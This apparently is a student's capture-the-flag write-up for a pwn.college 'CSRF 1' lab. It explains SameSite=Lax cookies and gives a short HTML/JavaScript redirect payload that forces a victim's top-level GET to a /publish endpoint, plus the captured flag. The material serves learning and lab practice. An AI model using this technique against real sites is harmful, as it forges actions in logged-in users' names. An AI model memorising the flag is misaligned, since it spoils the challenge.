@@ -1,0 +1,51 @@
+# challenge: CSRF 1
+
+📅 2026-03-01
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+challenge works the same as previous one but endpoint /publish is GET
+/challenge/victim perform a request to hacker.localhost in port 1337
+the goal is to redirect the victim to /publish
+the hard part is to trick the victim into making a GET to /publish WITH the cookie
+the browser sets SameSite="", this means its default: Lax 
+it means that on every redirections cookie r not sent excepts for Top-Level redirection with GET method
+-ran: '/challenge/server'
+-opened a new terminal
+-ran: 'vim index.html'
+-typed: '<!DOCTYPE html>'
+        '<html>'
+          '<body>'
+                '<script> window.location="http://challenge.localhost:80/publish" </script>'
+          '</body>'
+        '</html>'
+-ran: 'chmod a+x index.html'
+-ran: 'python3 -m http.server 1337'
+-opened a new terminal
+-ran: '/challenge/victim'
+-checked on /challenge/server to see logs 
+-the goal is to see GET /publish 302 in green
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as hacker-1337
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+super useful challenge to learn how cookies, browser protections, SameSite cookies, SOP work
+in this challenge the crucial part was understanding SameSite
+SameSite is a cookie attribute used to prevent CSRF. When SameSite=Lax (default) basically javascript executes and performs a cross site redirection, the cookies r not sent. the goal is to avoid data leakage.
+but cookies r sent only in one situation: Top-Level GET navigation
+to perform this we have 3 options:
+-window.location
+-Redirection 302 Found
+-meta page refresh
+this proves why javascript fetch function and <img src="..."> dont work in this case. cuz since they r NOT a Top-Level Navigation, cookies r not added to the request
+also found out another way to run server: python3 -m http.server [PORT]
+
+## 🏁 Flag  
+pwn.college{cqTvjRsSNbEs31BvAvWcuBTKCQn.QX3kzMzwCO4IDOxEzW}
